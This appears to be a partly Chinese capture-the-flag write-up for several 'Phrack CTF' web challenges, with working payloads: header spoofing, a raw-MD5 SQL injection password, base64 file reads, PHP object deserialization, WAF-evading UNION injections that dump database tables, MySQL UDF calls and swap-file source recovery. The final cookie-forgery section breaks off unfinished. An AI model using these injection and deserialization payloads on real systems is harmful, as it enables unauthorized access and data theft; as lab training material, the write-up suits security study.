# Phrack CTF WEB

1.  PORT51

    > Please use port 51 to visit this site.

    -   curl
    -   `curl --local-port 51 http://web.phrack.top:32772/`

2.  LOCALHOST

    -   `X-Forwarder-For: 127.0.0.1`

3.  Login

    -   password 129581926211651571912466741651878684928 or 1839431
    -   `PCTF{R4w_md5_is_d4ng3rous}`
    -   [SQL injection with raw MD5 hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
    -   [SQL injection with raw MD5 hashes ](http://www.joychou.org/index.php/web/SQL-injection-with-raw-MD5-hashes.html?utm_source=tuicool)

4.  神盾局的秘密

    > 这里有个通向神盾局内部网络的秘密入口，你能通过漏洞发现神盾局的秘密吗？

    -   题面源码很短：`<img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>`
    -   发现参数`img`的值为`c2hpZWxkLmpwZw==`，看起来好像是Base64的样子（根据曹小白的说法：1. 末尾有等号；2. 大小写混杂，解码后发现为`shield.jpg`，进一步验证想法。
    -   通过 `view-source:http://web.phrack.top:32779/showimg.php?img=c2hvd2ltZy5waHA=` 查看 `showimg.php` 源码：
        ```php
        <?php
        	$f = $_GET['img'];
        	if (!empty($f)) {
        		$f = base64_decode($f);
        		if (stripos($f,'..')===FALSE && stripos($f,'/')===FALSE && stripos($f,'\\')===FALSE
        		&& stripos($f,'pctf')===FALSE) {
        			readfile($f);
        		} else {
        			echo "File not found!";
        		}
        	}
        ?>
        ```
    -   `showimg.php` 源码中规定了`img`参数的打开规则：
        -   不允许包含`..`, `/`, `\\`, `pctf` 等字符
        -   传入的参数需要经过Base64编码
    -   尝试通过 `view-source:http://web.phrack.top:32779/showimg.php?img=aW5kZXgucGhw` 查看 `index.php` ：
        ```php
        <?php
        	require_once('shield.php');
        	$x = new Shield();
        	isset($_GET['class']) && $g = $_GET['class'];
        	if (!empty($g)) {
        		$x = unserialize($g);
        	}
        	echo $x->readfile();
        ?>
        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
        ```
    -   发现一个叫做`shield.php`的东西，`view-source:http://web.phrack.top:32779/showimg.php?img=c2hpZWxkLnBocA==` 得到：

        ```php
        <?php
        	//flag is in pctf.php
        	class Shield {
        		public $file;
        		function __construct($filename = '') {
        			$this -> file = $filename;
        		}

        		function readfile() {
        			if (!empty($this->file) && stripos($this->file,'..')===FALSE
        			&& stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
        				return @file_get_contents($this->file);
        			}
        		}
        	}
        ?>
        ```

    -   发现`//flag is in pctf.php`，简直开心，直接访问`view-source:http://web.phrack.top:32779/showimg.php?img=cGN0Zi5waHA=`获取flag，然而`File not found!`。
    -   返回去研究`index.php`源码，发现还有个名为`class`的参数未用。由源码，`class`应为经过序列化的一个名为`Shield`的类，定义见`shield.php`。
    -   通过以下代码生成需要传入`class`的值：

        ```php
        <?php
        class Shield {
            public $file;
            function __construct($filename = 'pctf.php') {
                $this -> file = $filename;
            }

            function readfile() {
                if (!empty($this->file) && stripos($this->file,'..')===FALSE
                && stripos($this->file,'/')===FALSE && stripos($this->file,'\\')==FALSE) {
                    return @file_get_contents($this->file);
                }
            }
        }
        $x = new Shield();
        // $g = "O:6:%22Shield%22:1:{s:4:%22file%22;s:8:%22pctf.php%22;}";
        $g = serialize($x);
        echo str_replace("\"", "%22", $g);  //强序列化后的内容转换为url中可传入的参数
        // echo $g;
        ?>
        ```

    -   得到页面源代码：

        ```php
        <?php
        	//Ture Flag : PCTF{W3lcome_To_Shi3ld_secret_Ar3a}
        	//Fake flag:
        	echo "FLAG: PCTF{I_4m_not_fl4g}"
        ?>
        <img src="showimg.php?img=c2hpZWxkLmpwZw==" width="100%"/>
        ```

    -   `PCTF{W3lcome_To_Shi3ld_secret_Ar3a}`

5.  IN A Mess

    > 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。

    -   页面内容`work harder!harder!harder!`
    -   查看源代码，发现只有一行：`<!--index.phps-->work harder!harder!harder!`。 **仔细** 观察，发现`index.phps`是什么鬼东西，遂打开看看。
    -   得到代码如下：
        ```php
        if(!$_GET['id'])
        {
            header('Location: index.php?id=1');
            exit();
        }
        $id=$_GET['id'];
        $a=$_GET['a'];
        $b=$_GET['b'];
        if(stripos($a,'.'))
        {
            echo 'Hahahahahaha';
            return ;
        }
        $data = @file_get_contents($a,'r');
        if ($data=="1112 is a nice lab!" and
            $id==0 and
            strlen($b)>5 and
            eregi("111".substr($b,0,1),"1114") and
            substr($b,0,1)!=4)
        {
            require("flag.txt");
        }
        else
        {
            print "work harder!harder!harder!";
        }
        ```
    -   通过代码可以得知，如果我们想要得到`flag.txt`则需要以下满足五个条件：
        1.  `$data=="1112 is a nice lab!"`，其中`$data = @file_get_contents($a,'r')`
        2.  `$id==0`
        3.  `strlen($b)>5`
        4.  `eregi("111".substr($b,0,1),"1114")`
        5.  `substr($b,0,1)!=4`
    -   所以构造出可以获得flag的连接：`index.php?id=0a&a=data:text/plain,1112%20is%20a%20nice%20lab!&b=.whaterever`，获得页面`Come ON!!! {/^HT2mCpcvOLf}`。
    -   查看新的地址`^HT2mCpcvOLf/index.php?id=1`，页面内容为`hi666`，测试GET参数`id`，发现有注入点和WAF。
    -   进行注入尝试：
        -   检查WAF
            -   `?id='--` 得到 `SELECT * FROM content WHERE id='--`
            -   `?id=0` 会跳转到 `?id=1`，判断为0条件不成立
            -   `?id='%20--` 得到 `you bad boy/girl!`，对空格有过滤，采用注释符`/*s*/`达到分割的目的。
            -   `?id=0/*s*/union/*s*/select/*s*/1,2,3/*s*/from/*s*/dual`，同样会被墙
        -   数据库信息搜集
            -   判定页面内容位置：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,3/*s*/frofromm/*s*/dual`，得到`3`
            -   判定数据库版本：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,version()/*s*/frofromm/*s*/dual`，得到`5.6.24`，判定为MySQL
            -   判定当前库名：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,database()/*s*/frofromm/*s*/dual`，得到`test`
            -   获得所有表名： `?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,group_concat(table_name)/*s*/frofromm/*s*/information_schema.tables/*s*/where/*s*/version=10`，得到`CHARACTER_SETS,COLLATIONS,COLLATION_CHARACTER_SET_APPLICABILITY,COLUMNS,COLUMN_PRIVILEGES,ENGINES,EVENTS,FILES,GLOBAL_STATUS,GLOBAL_VARIABLES,KEY_COLUMN_USAGE,OPTIMIZER_TRACE,PARAMETERS,PARTITIONS,PLUGINS,PROCESSLIST,PROFILING,REFERENTIAL_CONSTRAINTS,ROUTINES,SCHEMATA,SCHEMA_PRIVILEGES,SESSION_STATUS,SESSION_VARIABLES,STATISTICS,TABLES,TAB`
            -   获得`test`下表名：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,group_concat(table_name)/*s*/frofromm/*s*/information_schema.tables/*s*/where/*s*/table_schema=0x74657374`，得到`content`
                -   `0x74657374`为test十六进制编码
            -   获得`content`下列名：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,group_concat(column_name)/*s*/frofromm/*s*/information_schema.columns/*s*/where/*s*/table_schema=0x74657374`，得到`id,context,title`，所以我们之前能看到的`hi666`是`title`
        -   取得flag：`?id=0/*s*/ununionion/*s*/selselectect/*s*/1,2,context/*s*/frofromm/*s*/test.content`
            -   `PCTF{Fin4lly_U_got_i7_C0ngRatulation5}`
    -   Ref
        -   [PHP中的header函数](http://www.cnblogs.com/fengzheng126/archive/2012/04/21/2461475.html)
        -   [MySql注入科普](http://drops.wooyun.org/tips/123)
        -   [MySQL注入技巧](http://drops.wooyun.org/tips/7299)
        -   [MYSQL注入语句大全](http://www.2cto.com/Article/201108/99744.html)

6.  RE?

    > 咦，奇怪，说好的WEB题呢，怎么成逆向了？不过里面有个help_me函数挺有意思的哦

    -   so文件
    -   调用`help_me`
        ```sql
        create function help_me returns string soname 'udf.so';
        select help_me()
        ```
        -   得到
            ```sql
            +---------------------------------------------+
            | help_me()                                   |
            +---------------------------------------------+
            | use getflag function to obtain your flag!!  |
            +---------------------------------------------+
            1 row in set (0.00 sec)
            ```
    -   调用`getflag`，得到flag`PCTF{Interesting_U5er_d3fined_Function}`
        ```sql
        create function getflag returns string soname 'udf.so';
        select getflafg();
        ```

7.  flag在管理员手里
    -   Cookie
    -   windows:`~`, linux:'.file.swp'
        -   获取`index.php~`: `wget http://web.phrack.top:32785/index.php~`
        -   用vim恢复，`mv index.php~ .index.swp && vim -r .index.swp`，得到：
            ```php
            $auth = false;
            $role = "guest";
            $salt =
            if (isset($_COOKIE["role"])) {
                    $role = unserialize($_COOKIE["role"]);
                    $hsh = $_COOKIE["hsh"];
                    if ($role==="admin" && $hsh === md5($salt.strrev($_COOKIE["role"]))) {
                            $auth = true;
                    } else {
                            $auth = false;
                    }
            } else {
                    $s = serialize($role);
                    setcookie('role',$s);
                    $hsh = md5($salt.strrev($s));
                    setcookie('hsh',$hsh);
            }
            if ($auth) {
                    echo "<h3>Welcome Admin. Your flag is
            } else {
                    echo "<h3>Only Admin can see the flag!!</h3>";
            }
            ```
    -   恢复的代码内隐藏了$salt，已知的其他信息：
            - $cookie['role'] = 's:5:"guest";';
            - strrev($cookie['role']) = ';"tseug":5:s'
            - $hsh = '3a4727d57463f122833d9e732f94e4e0'
        > 长度扩展攻击（Length extension attacks）是指针对某些允许包含额外信息的加密散列函数的攻击手段。
        > 大部分web server在处理同样参数的不同内容时倾向于选择后面的，例如foo=1&foo=2，最后foo的值是2，但是有些web server也会使用前面的，这样这个方法就不能直接用了
